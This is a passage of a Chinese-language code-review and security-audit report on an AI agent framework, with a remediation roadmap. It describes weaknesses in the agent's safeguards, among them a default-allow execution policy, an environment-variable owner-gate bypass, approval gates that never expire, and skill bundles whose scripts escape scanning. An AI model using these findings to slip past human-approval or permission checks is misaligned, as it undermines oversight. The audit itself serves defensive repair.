网络获取可能无限期挂起；应有超时。

---

### 12. 循环检测在发现循环后继续 (`validate.py:62-63`)

在追加循环错误后，函数返回而不从 `visiting` 移除节点。错误列表可能包含同一节点的重复循环消息。

---

### 13. `_memory_by_tenant` 无限增长 (`orchestrator.py:101, 134-138`)

字典在首次访问时填充每个租户但从不驱逐。无 LRU 或 TTL 机制。

---

### 14. 秘密状态行路径暴露 (`config_secrets.py:116-127`)

只显示文件名（`path.name`），不显示完整路径。但如果文件不存在，错误消息中可能泄漏完整路径。

---

### 15. 负时间戳永不过期 (`human_gate.py:58-63`)

已在 CRITICAL #5 中列出。

---

### 16. `grant_once` 逻辑复杂性 (`permissions/approvals.py:112-142`)

复杂的回退逻辑可能导致批准错误的待处理请求（如果指纹错误但待处理存在）。

---

### 17. `_is_gate_expired` 返回负数时为 False (`human_gate.py:58-63`)

已在 CRITICAL #5 中列出。

---

### 18. 事件循环初始化竞态 (`mcp/async_runner.py:16-30`)

双重检查锁定模式被非原子赋值破坏。在 `return _loop` 和 `_loop = loop` 之间，另一线程可能看到 `_loop` 已设置但循环尚未运行。

---

### 19. 仅扫描 .md/.txt 文件 (`registry/skill_install.py:50`)

如果 bundle 包含 `.py` 或 `.sh` 文件，它们通过隔离并在安装后存在于磁盘上。

---

### 20. JSONDecodeError 返回 None 无日志 (`post_session.py:129`)

已在 HIGH #39 中列出。

---

## 按模块分类汇总

| 模块 | CRITICAL | HIGH | MEDIUM | LOW |
|------|----------|------|--------|-----|
| orchestrator.py | 0 | 1 | 1 | 2 |
| task_orchestrator.py | 0 | 3 | 2 | 0 |
| main.py | 0 | 0 | 2 | 0 |
| agent_profiles.py | 0 | 0 | 0 | 0 |
| agents_md.py | 0 | 0 | 2 | 1 |
| config.py | 1 | 2 | 1 | 2 |
| config_service.py | 0 | 2 | 1 | 0 |
| config_secrets.py | 1 | 2 | 1 | 2 |
| gateway_settings.py | 0 | 1 | 0 | 0 |
| provider_presets.py | 0 | 0 | 0 | 0 |
| model_resolve.py | 0 | 0 | 0 | 0 |
| env_parse.py | 0 | 0 | 0 | 0 |
| transport/* | 0 | 2 | 3 | 2 |
| tools/* | 0 | 2 | 4 | 1 |
| tool_guardrails.py | 0 | 1 | 4 | 0 |
| runtime/* | 3 | 5 | 6 | 2 |
| human_gate.py | 2 | 2 | 2 | 2 |
| execution_context.py | 0 | 0 | 1 | 0 |
| delegate/* | 0 | 3 | 1 | 1 |
| session/* | 1 | 1 | 3 | 2 |
| gateway/* | 1 | 3 | 4 | 1 |
| registry/* | 0 | 2 | 3 | 1 |
| project/* | 0 | 1 | 0 | 0 |
| memory/* | 0 | 2 | 2 | 0 |
| plan/* | 0 | 0 | 0 | 0 |
| report/* | 0 | 0 | 2 | 0 |
| hooks/* | 0 | 0 | 1 | 0 |
| io/* | 0 | 0 | 0 | 0 |
| execpolicy/* | 1 | 1 | 2 | 1 |
| permissions/* | 1 | 2 | 3 | 0 |
| mcp/* | 0 | 1 | 3 | 1 |
| skills/* | 0 | 1 | 0 | 1 |

---

## 优先修复建议

### 优先级 1 (CRITICAL - 立即修复)

1. **修复执行策略默认允许** (`execpolicy/engine.py`) — 当启用但无规则匹配时返回 FORBIDDEN
2. **添加文件锁/原子操作** (`audit.py`, `human_gate.py`, `push_queue.py`, `task_store.py`) — 使用 `fcntl.flock()` 或原子文件重命名
3. **验证 gate 时间戳** (`human_gate.py`) — 添加 `created_at < 0` 检查使无效时间戳立即过期
4. **修复 Owner Gate 绕过** (`gateway/owner_gate.py`) — env var 应在 dev/test 模式外默认禁用
5. **添加幂等性 key 生成** (`message_handler.py`) — 即使 `external_id` 为空也生成唯一 key
6. **添加 ReDoS 防护** (`permissions/rules.py`) — 在正则表达式评估中添加超时
7. **修复 SSRF 重定向** (`download_tools.py`, `web_fetch.py`) — 禁用自动重定向或重新验证最终 URL
8. **添加 JSON 解析失败日志** (`post_session.py`) — 记录而不是静默忽略解析失败

### 优先级 2 (HIGH - 合并前修复)

1. **使文件写入原子化** (`task_store.py`, `config_secrets.py`)
2. **添加 API 密钥验证** (`config.py`)
3. **修复可变状态** (`execute_graph`, `_run_with_retry`)
4. **使用 deque 优化拓扑排序** (`task_orchestrator.py`)
5. **添加网关速率限制** (`message_handler.py`)
6. **修复 UTF-8 字符处理** (`memory_context_scrubber.py`)
7. **修复 Subagent 默认拒绝列表**
8. **添加 DNS 重绑定防护**

### 优先级 3 (MEDIUM - 短期内修复)

1. **修复 async 模式** (`delegate_job.py`)
2. **改进错误日志级别** — 将 `logger.debug` 改为 `logger.warning`
3. **添加网络超时** — 在所有 registry 网络调用中
4. **扩展注入检测模式**
5. **锚定命令正则表达式**
6. **规范化工具名称比较**

### 优先级 4 (LOW - 计划重构)

1. **拆分 main.py** — 提取到 `butler/cli/commands/` 子模块
2. **提取魔法数字** — 到模块级命名常量
3. **缓存会话密钥哈希** — 在 `human_gate.py` 中
4. **添加配置验证** — 必需环境变量验证
5. **实现 LRU 缓存** — 对于 `_memory_by_tenant`

---

## 正面发现

以下模块/模式实现良好：

- **路径安全设计** (`path_safety.py`): 深度防御模型
- **Schema 清理** (`schema_sanitizer.py`): 正确的深拷贝语义
- **思考清理状态机** (`think_scrubber.py`): 正确的边界处理
- **内容规范化** (`types.py`): 正确的 JSON 解码错误处理
- **Guardrail 配置** (`tool_guardrails.py`): 冻结 dataclass 设计和正确的 env-var 验证
- **无硬编码秘密**: 所有 API 密钥通过环境变量获取
- **YAML 使用 safe_load**: 无通过 YAML 的任意代码执行
- **原子文件写入**: `butler/io/atomic_write.py` 使用正确的临时文件交换模式
- **PII 清理**: 出站消息的 PII 清理 (`pii_scrub.py`)
- **SSRF 保护**: 注册表 URL 获取的 SSRF 保护 (`url_safety.py`)
- **会话密钥清理**: 安全的会话密钥处理 (`_safe_segment`)
- **WAL 模式**: SQLite experience store 使用 WAL 模式

---

---

## 十一、验证状态（2026-05-28 复检）

> 由人类审查员通过代码审查验证（非 agent 二手报告）
> 验证方法：直接读取源代码、运行命令行检查

### 验证通过的问题（确认存在）

| 编号 | 问题 | 验证结果 |
|------|------|----------|
| #1 | message_handler.py 1511行 | ✅ 确认：1511行 |
| #2 | registry.py 1055行 | ✅ 确认：1055行 |
| #3 | _run_turn_body 389行 | ✅ 确认：sed 验证 389行 |
| #4 | _handle_command 526行 | ✅ 确认：sed 验证 526行 |
| #13 | _STORE_CACHE 无限增长 | ✅ 确认：无淘汰机制 |
| #14 | _messages 无限积累 | ✅ 确认：有 compaction 但无硬限制 |
| #15 | 同步写盘阻塞 | ✅ 确认：add() 调用 _persist() |
| #27 | spawn_parallel 无并发限制 | ✅ 确认：无 Semaphore |
| #41 | 重试无指数退避 | ✅ 确认：无 asyncio.sleep |
| #16 | _tool_prefetch 异常路径未清理 | ✅ 确认：clear() 在 try 外 |
| #17 | WeChat token 部分明文日志 | ✅ 确认：line 1027-1028 |
| #19 | 危险函数黑名单可绕过 | ✅ 确认：单词边界黑名单 |
| #20 | 重复导入 test_gateway_handler.py | ✅ 确认：line 22, 24 |

### 验证命令记录

```bash
# 文件大小
$ wc -l butler/gateway/message_handler.py butler/tools/registry.py
1511 butler/gateway/message_handler.py
1055 butler/tools/registry.py

# 函数大小
$ sed -n '142,530p' butler/core/agent_loop.py | wc -l
389
$ sed -n '929,1454p' butler/gateway/message_handler.py | wc -l
526

# 无限增长缓存
$ grep -n "_STORE_CACHE" butler/memory/vector_store.py
227:_STORE_CACHE: dict[str, VectorStore] = {}
232:    if collection in _STORE_CACHE:
246:    _STORE_CACHE[collection] = store

# 同步写盘
$ grep -n "_persist\|add.*self._docs" butler/memory/vector_store.py
164:    def _persist(self) -> None:
183:        self._persist()
219:            self._persist()

# 无并发限制
$ grep -n "spawn_parallel" butler/task_orchestrator.py
296:    async def spawn_parallel(self, configs: list[AgentSpawnConfig]) -> list[AgentResult]:
$ sed -n '296,302p' butler/task_orchestrator.py
async def spawn_parallel(self, configs: list[AgentSpawnConfig]) -> list[AgentResult]:
    tasks = [self.spawn_agent(cfg) for cfg in configs]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    return [_coerce_agent_result(result) for result in results]

# 重试无退避
$ sed -n '519,560p' butler/task_orchestrator.py | grep -n "sleep"
(无 asyncio.sleep)

# 重复导入
$ sed -n '22,24p' tests/test_gateway_handler.py
from butler.report import AgentReport, Change, cache_report, clear_report_cache
from butler.project.manager import ProjectManager
from butler.report import AgentReport, cache_report  # 重复
```

---

*报告生成: 12 个并行 code-reviewer/security-reviewer subagent（初次审查 + 深度分析）*
*审查时间: 2026-05-28*
*更新: 添加了深度分析发现的新问题 + 验证状态*
*复检时间: 2026-05-28（人类审查员验证）*

---

## 十二、复检核实结果（2026-05-28 本轮审查）

> 本轮通过 6 轮并行 subagent 深度检查 + 代码级核实
> 核实方法: 4 个并行验证 agent 直接读取源代码确认问题存在/不存在

### 原报告误报修正

| 原报告问题 | 原评级 | 核实结果 | 说明 |
|-----------|--------|----------|------|
| `fallback.py:61` 的 `break` 导致只添加第一个 fallback | HIGH | **不存在** | for 循环无 break，会添加所有匹配的 alt provider |
| `task_orchestrator.py:680-689` 后台线程创建孤立 orchestrator | HIGH | **不存在** | 代码已有 `copy_context()` (line 212) |

### 核实后确认存在的问题

#### CRITICAL (4个 - 代码结构性缺陷)

| # | 问题 | 文件:行 | 证据 |
|---|------|---------|------|
| C-1 | 循环引用 `_attached_loop` ↔ `AgentLoop` | `context_pipeline.py:35,194-200` | `ContextPipeline._attached_loop → AgentLoop`，无法隔离测试 |
| C-2 | `_dispatch_one` ~130行过深嵌套 | `tool_batch.py:115-243` | 4+层嵌套，多职责混杂 |
| C-3 | Config 对象可变突变 | `agent_loop.py:176-187,467` | `original_config` → 修改 → `finally` 恢复，非原子性 |
| C-4 | 全局 `PerToolCallLimiter` 单例 race | `tool_call_limits.py:32-39` | 多线程共享，`reset_tool_call_limiter_for_turn()` 在多处被调用 |

#### HIGH (10个 - 已代码核实)

| # | 问题 | 文件:行 | 证据 |
|---|------|---------|------|
| H-1 | SSRF 导入外部包 (安全关键) | `wechat_ilink.py:1697` | `from tools.url_safety` 而非 `butler.registry.url_safety` |
| H-2 | FTS 失败静默降级 | `butler_memory.py:296` | `except OperationalError: pass` 无日志 |
| H-3 | SemanticIndex 全表扫描 | `semantic_index.py:175-181` | `fetchall()` 无 LIMIT，全量 Python 计算 |
| H-4 | InMemoryVectorStore 无 eviction | `vector_store.py:147,183` | `_docs` 无界增长，每次 add 同步写 |
| H-5 | SkillRouter._embedding_cache 无界 | `router.py:13,44-49` | 只增不清理 |
| H-6 | error_classifier 404 逻辑缺陷 | `error_classifier.py:98-99` | `retryable=False, should_fallback=True` |
| H-7 | _get_anthropic_client 静默降级 | `llm_client.py:98-106` | Anthropic 不可用时创建 OpenAI client |
| H-8 | 异常后无恢复 | `main.py:224-226` | 只打印不重建 agent_loop |
| H-9 | ProjectManager 单例 race | `manager.py:24-30` | check-then-act 无锁 |
| H-10 | MCP stdio allowlist 环境变量无验证 | `mcp_install.py:57-65` | 内容无 sanitize |

### 优先修复路线图（本轮审查）

**Sprint 1 (立即)**:
1. **H-1**: SSRF 导入路径 — 改一行导入即可
2. **C-1**: 循环引用 — 传递 provider/model 参数
3. **C-4**: 全局 limiter — 改为实例成员

**Sprint 2 (短期)**:
4. **H-2**: FTS 静默降级加日志
5. **H-3**: SemanticIndex 全表扫描 — 加 SQL LIMIT
6. **H-8**: 异常后重建 agent_loop
7. **C-2**: _dispatch_one 重构

**Sprint 3 (中期)**:
8. **H-4**: InMemoryVectorStore eviction
9. **H-5**: SkillRouter cache eviction
10. **H-6**: error_classifier 逻辑改进
11. **H-9**: ProjectManager race fix

### 本轮审查覆盖范围

| 模块 | 核心问题 |
|------|----------|
| Core Agent Loop | `agent_loop.py`, `context_pipeline.py`, `tool_batch.py`, `llm_retry.py` | C-1, C-2, C-3, C-4, H-6 |
| Transport | `llm_client.py`, `fallback.py`, `error_classifier.py`, `providers.py` | H-6, H-7 |
| Gateway | `wechat_ilink.py`, `message_handler.py`, `message_queue.py` | H-1 |
| Memory/Skills | `semantic_index.py`, `butler_memory.py`, `vector_store.py`, `router.py` | H-2, H-3, H-4, H-5 |
| Tools/Security | `path_safety.py`, `mcp_install.py`, `registry.py` | H-1, H-10, M-11, M-12 |
| CLI/Orchestrator | `main.py`, `task_orchestrator.py`, `manager.py` | H-8, H-9, C-4 |